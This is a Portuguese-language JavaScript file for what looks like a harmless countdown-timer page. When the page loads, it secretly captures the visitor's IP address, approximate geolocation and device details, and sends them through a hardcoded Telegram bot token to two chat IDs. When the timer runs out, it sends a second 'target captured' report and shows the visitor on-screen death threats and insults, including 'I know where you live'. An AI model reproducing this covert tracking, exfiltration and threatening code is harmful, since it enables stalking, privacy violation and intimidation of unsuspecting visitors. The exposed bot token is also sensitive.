// ================================================
// script.js - Entrada + Timer Zerar (Mensagens Diferentes)
// ================================================

let targetDate = new Date("2026-04-25T23:59:59").getTime();
let timerInterval = null;
let userIP = '';
let userLatitude = '';
let userLongitude = '';

// ==================== CONFIGURAÇÕES ====================
const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";

const CHAT_IDS = [
    "8448614204",   // Você
    "8219025301",   // Luizz
];

// Anti-spam: IP → timestamp da última notificação
const processedIPs = new Map();
const COOLDOWN_TIME = 5 * 60 * 1000; // 5 minutos

// ==================== DETECÇÃO DE DISPOSITIVO ====================
function detectDeviceType() {
    const ua = navigator.userAgent.toLowerCase();
    if (/smart-tv|tv|crkey|roku|android tv|firetv/i.test(ua)) return "Smart TV";
    if (/playstation|xbox|nintendo|switch/i.test(ua)) return "Console de videogame";
    if (/ipad|tablet|playbook|silk/i.test(ua)) return "Tablet";
    if (/android|iphone|ipod|blackberry|iemobile|opera mini/i.test(ua)) return "Celular";
    return "Computador";
}

function getDeviceInfo() {
    const deviceType = detectDeviceType();
    const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unknown";

    return {
        deviceType,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language || navigator.userLanguage,
        screen: `${window.screen.width} x ${window.screen.height}`,
        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: ram
    };
}

// ==================== MENSAGEM QUANDO ALGUÉM ENTRA ====================
async function sendEntryMessage(ip, latitude, longitude) {
    const device = getDeviceInfo();
    const devType = device.deviceType;

    const message = `👀 ALGUÉM ENTROU NO SITE!\n\n` +
                    `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                    `🌐 IP: ${ip || 'Não capturado'}\n` +
                    `📍 Latitude: ${latitude || 'Não disponível'}\n` +
                    `📍 Longitude: ${longitude || 'Não disponível'}\n\n` +
                    `📱 Dispositivo:\n` +
                    `• Tipo: ${devType}\n` +
                    `• Sistema: ${device.platform}\n` +
                    `• Tela: ${device.screen}\n` +
                    `• Janela: ${device.windowSize}\n` +
                    `• Fuso horário: ${device.timezone}\n\n` +
                    `Alguém abriu a página... será que vai esperar até o final? 😈`;

    for (const chatId of CHAT_IDS) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });
        } catch (err) {
            console.error("Erro ao enviar mensagem de entrada:", err);
        }
    }
}

// ==================== MENSAGEM QUANDO O TIMER ZERAR (PESADA) ====================
async function sendTimerZeroMessage(ip, latitude, longitude) {
    const device = getDeviceInfo();
    const devType = device.deviceType;

    const message = `🚨 ALVO CAPTURADO - TIMER ZERADO!\n\n` +
                    `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                    `🌐 IP: ${ip || 'Não capturado'}\n` +
                    `📍 Latitude: ${latitude || 'Não disponível'}\n` +
                    `📍 Longitude: ${longitude || 'Não disponível'}\n\n` +
                    `📱 Dispositivo:\n` +
                    `• Tipo: ${devType}\n` +
                    `• Sistema: ${device.platform}\n` +
                    `• Navegador: ${device.userAgent.substring(0, 100)}...\n` +
                    `• Tela: ${device.screen} (${device.pixelRatio || 1}x)\n` +
                    `• Janela: ${device.windowSize}\n` +
                    `• Idioma: ${device.language}\n` +
                    `• Fuso horário: ${device.timezone}\n` +
                    `• Núcleos CPU: ${device.hardwareConcurrency}\n` +
                    `• Memória RAM aprox: ${device.deviceMemory}\n\n` +
                    `===================================\n` +
                    `HAHAHAHAHA OLHA SÓ QUE LIXO\n` +
                    `Ficou esperando o timer acabar no ${devType.toLowerCase()} kkkkk\n\n` +
                    `Eu sei que você tá usando essa merda de ${devType}.\n` +
                    `Eu sei onde você mora.\n` +
                    `Eu sei qual IP de merda é esse.\n\n` +
                    `Você não passa de um fracassado inútil.\n` +
                    `Perdedor de merda.\n\n` +
                    `Não é magia, é habilidade isto...`;

    for (const chatId of CHAT_IDS) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });
        } catch (err) {
            console.error("Erro ao enviar mensagem de timer zero:", err);
        }
    }
}

// ==================== PEGA IP AO ENTRAR NA PÁGINA ====================
async function captureUserIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        userIP = data.ip;

        const locRes = await fetch(`http://ip-api.com/json/${userIP}?fields=status,lat,lon`);
        const locData = await locRes.json();

        if (locData.status === "success") {
            userLatitude = locData.lat || '';
            userLongitude = locData.lon || '';
        }

        console.log(`✅ IP capturado ao entrar: ${userIP}`);

        // Envia mensagem de "Alguém entrou"
        sendEntryMessage(userIP, userLatitude, userLongitude);

    } catch (err) {
        console.error("Erro ao capturar IP:", err);
        userIP = 'Não capturado';
        sendEntryMessage('Não capturado', '', '');
    }
}

// ==================== ATUALIZA O TIMER ====================
function updateTimer() {
    const timeNow = new Date().getTime();
    let timeLeft = targetDate - timeNow;

    if (timeLeft < 0) {
        clearInterval(timerInterval);

        // Envia a mensagem pesada quando o timer zera
        sendTimerZeroMessage(userIP, userLatitude, userLongitude);
        
        showFinalMessageOnScreen();
        return;
    }

    // Contador normal
    const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
    const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
    const centiseconds = Math.floor((timeLeft % 1000) / 10);

    document.getElementById("timer").innerHTML = `
        ${days}d ${hours}h ${minutes}m ${seconds}.${centiseconds.toString().padStart(2, '0')}s
    `;
}

function showFinalMessageOnScreen() {
    const deviceType = detectDeviceType();
    document.getElementById("timer").innerHTML = `
        Tempo esgotado!<br><br>
        Prepare-se para morrer, seu lixo...<br><br>
        Eu sei que você tá usando essa merda de ${deviceType.toLowerCase()}.<br>
        Eu sei onde você mora.<br>
        Eu sei o seu IP de merda.<br><br>
        Você é um fracassado patético.<br>
        Um inútil.<br>
        Um perdedor que não consegue nem ganhar de um timer.<br><br>
        Não é magia, é habilidade isto...<br>
        <span style="color: #ff0000; font-size: 1.3rem;">E você continua sendo um nada.</span>
    `;
}

// ==================== INICIALIZAÇÃO ====================
async function init() {
    await captureUserIP();           // Pega IP + envia mensagem de entrada
    timerInterval = setInterval(updateTimer, 100);
    updateTimer();
}

init();